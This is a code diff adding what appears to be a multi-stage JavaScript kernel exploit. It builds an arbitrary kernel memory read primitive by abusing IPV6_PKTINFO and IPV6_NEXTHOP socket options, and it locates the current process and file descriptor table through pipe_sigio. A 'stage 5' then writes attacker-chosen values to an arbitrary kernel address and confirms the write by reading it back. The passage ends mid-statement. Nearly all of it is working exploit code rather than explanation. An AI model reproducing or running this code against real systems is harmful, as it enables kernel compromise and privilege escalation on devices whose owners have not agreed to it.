+                    return sc(SYS.setsockopt, pktoptsTwins[0], IPPROTO_IPV6,
+                        IPV6_PKTINFO, pktinfo.addr, 0x14).i32;
+                }
+
+                function pktinfoGet() {
+                    pktinfo.u8.fill(0);
+                    optLen.dv.setInt32(0, 0x14, true);
+                    const r = sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
+                        IPV6_PKTINFO, pktinfo.addr, optLen.addr).i32;
+                    return r === 0 ? new int64(pktinfo.dv.getUint32(0, true),
+                                               pktinfo.dv.getUint32(4, true))
+                                   : null;
+                }
+
+                function kread8(addr) {
+                    kreadCalls++;
+                    let off = 0;
+                    kbuf.u8.fill(0);
+                    while (off < 8) {
+                        pktinfo.u8.fill(0);
+                        put(pktinfo.dv, 0, pktinfoSelf);
+                        put(pktinfo.dv, 8, addr.add32(off));
+                        if (sc(SYS.setsockopt, pktoptsTwins[0], IPPROTO_IPV6,
+                                IPV6_PKTINFO, pktinfo.addr, 0x14).i32 === -1) {
+                            kreadFail++; return null;
+                        }
+                        nhopLen.dv.setInt32(0, 8 - off, true);
+                        if (sc(SYS.getsockopt, pktoptsTwins[0], IPPROTO_IPV6,
+                                IPV6_NEXTHOP, kbuf.addr.add32(off),
+                                nhopLen.addr).i32 === -1) {
+                            kreadFail++; return null;
+                        }
+                        const n = nhopLen.dv.getInt32(0, true);
+                        if (n === 0) { kbuf.dv.setUint8(off, 0); off += 1; }
+                        else off += n;
+                    }
+                    return new int64(kbuf.dv.getUint32(0, true),
+                                     kbuf.dv.getUint32(4, true));
+                }
+
+                const cvWord = kread8(evfCv);
+                let kstr = "";
+                if (cvWord) {
+                    for (let i = 0; i < 8; ++i) {
+                        const c = kbuf.dv.getUint8(i);
+                        if (c === 0) break;
+                        kstr += String.fromCharCode(c);
+                    }
+                }
+                mark("KREAD-EVF-CV", evfCv + " -> " + (cvWord || "FAILED")
+                    + "  as text: '" + kstr + "'");
+                if (!check("kernel-memory-reads-string-evf",
+                        kstr === "evf cv", "got '" + kstr + "'")) return false;
+
+                const myPid = sc(SYS.getpid).i32;
+                let curproc = null, curprocFrom = "none";
+
+                if (kLeakFp) {
+                    const pipeL = kread8(kLeakFp);
+
+                    let cnt = null, sz = null, buf = null;
+                    if (pipeL && kptr(pipeL)) {
+                        cnt = kread8(pipeL);
+                        sz = kread8(pipeL.add32(8));
+                        buf = kread8(pipeL.add32(0x10));
+                    }
+                    const readEnd = !!buf && kptr(buf) && !!sz && sz.hi === 0x4000;
+                    const writeEnd = !!buf && buf.low === 0 && buf.hi === 0
+                        && !!sz && sz.low === 0 && sz.hi === 0;
+                    mark("SIGIO-PIPE", "ar2_file " + kLeakFp + " -> f_data "
+                        + (pipeL || "?") + "   pipebuf cnt|in=" + (cnt || "?")
+                        + " out|size=" + (sz || "?") + " buffer=" + (buf || "?")
+                        + "   looks like " + (readEnd ? "a read end"
+                            : writeEnd ? "a write end (no buffer of its own, "
+                                + "which is what pipe_create(wpipe, 0) makes)"
+                            : "neither"));
+
+                    if (pipeL && kptr(pipeL)) {
+
+                        const sigBefore = kread8(pipeL.add32(0xd0));
+                        const pidBuf = alloc(4);
+                        pidBuf.dv.setInt32(0, myPid, true);
+                        const io = sc(SYS.ioctl, leakPipe[1], FIOSETOWN,
+                            pidBuf.addr).i32;
+                        const sigAfter = io === 0
+                            ? kread8(pipeL.add32(0xd0)) : null;
+                        mark("SIGIO-WALK", "ioctl(FIOSETOWN)=" + io
+                            + "  pipe_sigio before=" + (sigBefore || "?")
+                            + " after=" + (sigAfter || "?"));
+                        const appeared = !!sigBefore && sigBefore.low === 0
+                            && sigBefore.hi === 0 && !!sigAfter && kptr(sigAfter);
+                        check("pipe_sigio-null-became-kernel-pointer"
+                            + "exactly when FIOSETOWN was called", appeared,
+                            appeared ? "so ar2_file+0 is f_data and +0xd0 is "
+                                + "pipe_sigio, both confirmed by a transition "
+                                + "we caused"
+                                : "no transition, so this walk is not trusted");
+
+                        if (appeared) {
+                            const cand = kread8(sigAfter);
+                            const pid2 = (cand && kptr(cand))
+                                ? kread8(cand.add32(0xb0)) : null;
+                            const ok = !!pid2 && pid2.low === myPid && pid2.hi === 0;
+                            mark("SIGIO-PID", "sigio->proc=" + (cand || "?")
+                                + "  p_pid=" + (pid2 ? pid2.low : "?")
+                                + " getpid=" + myPid);
+                            check("proc-sigio-names-proc", ok,
+                                ok ? "p_pid matches getpid(), so this is curproc "
+                                    + "-- with no aio_info anywhere in the path"
+                                    : "p_pid " + (pid2 ? pid2.low : "?")
+                                    + " -- rejected");
+                            if (ok) { curproc = cand; curprocFrom = "sigio"; }
+                        }
+                    }
+                }
+
+                let aioCurproc = null;
+                for (let t = 0; t < 5 && !(aioCurproc && kptr(aioCurproc)); ++t) {
+                    aioCurproc = kread8(aioInfoAddr.add32(8));
+                    if (aioCurproc && kptr(aioCurproc)) break;
+                    preTs.u8.fill(0);
+                    preTs.dv.setUint32(8, 2000000, true);
+                    sc(SYS.nanosleep, preTs.addr, 0);
+                }
+                mark("KREAD-CURPROC", "aio_info+8 = "
+                    + (aioCurproc ? aioCurproc.toString() : "FAILED")
+                    + (aioCurproc && kptr(aioCurproc) ? "  (kernel pointer)"
+                        : "  (NOT a kernel pointer -- ar2_info was reclaimed)"));
+                if (aioCurproc && kptr(aioCurproc) && !curproc) {
+                    curproc = aioCurproc; curprocFrom = "aio_info";
+                }
+                if (curproc && aioCurproc && kptr(aioCurproc))
+                    check("curproc-routes-agree",
+                        sameI64(curproc, aioCurproc),
+                        curprocFrom === "sigio"
+                            ? "sigio " + curproc + " vs aio_info " + aioCurproc
+                            : "");
+
+                if (!(curproc && kptr(curproc))) {
+                    mark("CURPROC-UNAVAILABLE", "neither route produced a proc. "
+                        + "ar2_file=" + (kLeakFp || "null") + ", aio_info at "
+                        + aioInfoAddr + " reads " + (aioCurproc || "null")
+                        + ". This gates the ofiles walk only; the kernel WRITE "
+                        + "below is unaffected.");
+                } else {
+                    mark("CURPROC", curproc + " via " + curprocFrom);
+                }
+                const haveCurproc = !!(curproc && kptr(curproc));
+                if (haveCurproc) {
+                    check("curproc-kernel-pointer", true, curproc.toString());
+                    const pPid = kread8(curproc.add32(0xb0));
+                    mark("KREAD-PID", "p_pid=" + (pPid ? pPid.low : "?")
+                        + " getpid=" + myPid);
+                    check("pid-read-kernel-matches-getpid",
+                        !!pPid && pPid.low === myPid && pPid.hi === 0,
+                        (pPid ? pPid.low : "?") + " vs " + myPid);
+
+                    const pFd = kread8(curproc.add32(0x48));
+                    const fdtOfiles = pFd ? kread8(pFd) : null;
+                    mark("KREAD-FDT", "p_fd=" + (pFd || "?")
+                        + " fdt_ofiles=" + (fdtOfiles || "?"));
+                    check("file-descriptor-table-reachable",
+                        !!fdtOfiles && kptr(fdtOfiles),
+                        fdtOfiles ? fdtOfiles.toString() : "null");
+
+                    if (kLeakFp && fdtOfiles && kptr(fdtOfiles)) {
+                        const slot = kread8(fdtOfiles.add32(leakPipe[1] * 8));
+                        const match = !!slot && sameI64(slot, kLeakFp);
+                        mark("OFILES-CROSSCHECK", "ofiles[" + leakPipe[1] + "] = "
+                            + (slot || "?") + "   ar2_file said " + kLeakFp);
+                        check("ofiles-table-contains-struct-file"
+                            + "stage 2 leaked", match,
+                            match ? "so fdt_ofiles is correct and entries are 8 "
+                                + "bytes apart, not FreeBSD's 0x30"
+                                : "the table, the stride, or curproc is wrong");
+                    }
+
+                    if (fdtOfiles && kptr(fdtOfiles) && pipesOk) {
+                        const FILEDESCENT_SIZE = 8;
+                        function pipeFData(fd) {
+                            const fp = kread8(fdtOfiles.add32(fd * FILEDESCENT_SIZE));
+                            if (!fp || !kptr(fp)) return null;
+                            const d = kread8(fp);
+                            return (d && kptr(d)) ? { fp: fp, data: d } : null;
+                        }
+                        const m = pipeFData(masterPipe[0]);
+                        const sl = pipeFData(slavePipe[0]);
+                        mark("PIPE-FILE", "master fd " + masterPipe[0] + " file="
+                            + (m ? m.fp : "?") + " f_data=" + (m ? m.data : "?"));
+                        mark("PIPE-FILE", "slave  fd " + slavePipe[0] + " file="
+                            + (sl ? sl.fp : "?") + " f_data=" + (sl ? sl.data : "?"));
+                        const both = !!m && !!sl && m.data.low !== sl.data.low;
+
+                        if (both) {
+                            pipeM = m.data; pipeS = sl.data;
+                            pipeMFp = m.fp; pipeSFp = sl.fp;
+                            kFdtOfiles = fdtOfiles;
+                        }
+                        check("pipes-struct-pipe-addresses-read",
+                            both, both ? "" : "one of them did not resolve");
+                        if (both) {
+
+                            const pb = [];
+                            for (let o = 0; o < 0x18; o += 8)
+                                pb.push(kread8(m.data.add32(o)));
+                            mark("PIPEBUF", "master pipebuf now: "
+                                + pb.map(function (x) { return x ? x.toString() : "?"; })
+                                    .join(" "));
+                        }
+                    } else if (!pipesOk) {
+                        mark("PIPE-WALK-SKIPPED", "no pipe pairs to walk");
+                    }
+                } else {
+                    mark("FDT-WALK-SKIPPED", "no live curproc, so the ofiles "
+                        + "walk cannot run. That walk is only needed for the "
+                        + "PIPE route to fast R/W -- the write primitive below "
+                        + "comes out of ip6po_pktinfo and needs none of it.");
+                }
+
+                mark("KREAD-STATS", kreadCalls + " kread8 calls, "
+                    + kreadFail + " failed");
+
+                state("stage 5: kernel write...", "warn");
+
+                const kwTarget = pktinfoSelf.sub32(8);
+                const KW_A = 0x4b571337, KW_B = 0xfeedc0de;
+
+                const before = kread8(kwTarget);
+                mark("KWRITE-TARGET", kwTarget + " currently holds "
+                    + (before || "unreadable"));
+
+                const aimRc = pktinfoSet(function (dv) {
+                    put(dv, 0, kwTarget);
+                    put(dv, 8, new int64(0, 0));
+                });
+                const seen = pktinfoGet();
+                const aimOk = aimRc === 0 && seen !== null && before !== null
+                    && seen.low === before.low && seen.hi === before.hi;
+                mark("KWRITE-AIM", "ip6po_pktinfo -> " + kwTarget
+                    + " (setsockopt=" + aimRc + "); reading back through it "
+                    + "gives " + (seen || "null") + ", target held " + (before || "?"));
+                check("write-pointer-landed-where-aimed", aimOk,
+                    aimOk ? "" : "getsockopt(IPV6_PKTINFO) does not match an "
+                        + "independent kread8 of the target -- NOT writing");
+
+                if (!aimOk) {
+
+                    for (let r = 0; r < 8; ++r) {
+                        put(sprayRthdr.dv, PKTOPTS_PKTINFO, pktinfoSelf);
+                        for (let i = 0; i < ipv6Socks.length; ++i)
+                            sc(SYS.setsockopt, ipv6Socks[i], IPPROTO_IPV6,
+                                IPV6_RTHDR, sprayRthdr.addr, karwLen);
+                        const c = kread8(evfCv);
+                        if (c && kbuf.dv.getUint8(0) === 0x65) break;
+                    }
+                    mark("KWRITE-ABORTED", "aim=unconfirmed write=none "
+                        + "selfref=restored");
+                } else {
+
+                    const wrc = pktinfoSet(function (dv) {
+                        dv.setUint32(0, KW_A, true);
+                        dv.setUint32(4, KW_B, true);
+                        put(dv, 8, pktinfoSelf);
+                    });
+                    const back = kread8(kwTarget);
+                    const wroteOk = wrc === 0 && back !== null
+                        && back.low === KW_A && back.hi === KW_B;
+                    mark("KWRITE", "wrote " + hx(KW_B) + hx(KW_A).slice(2)
+                        + " at " + kwTarget + " (setsockopt=" + wrc
+                        + "), kread8 returns " + (back || "unreadable"));
+                    check("arbitrary-kernel-address-took-20",
+                        wroteOk, wroteOk ? "" : "read back " + (back || "null"));
+
+                    const cvAgain = kread8(evfCv);
+                    let kstr2 = "";
+                    if (cvAgain) for (let i = 0; i < 8; ++i) {
+                        const c = kbuf.dv.getUint8(i);
+                        if (c === 0) break;
+                        kstr2 += String.fromCharCode(c);
+                    }
+                    check("read-primitive-survives-write", kstr2 === "evf cv",
+                        "'" + kstr2 + "' after " + kwriteCalls + " pktinfo writes");
+                    check("ip6po_pktinfo-not-left-interior",
+              
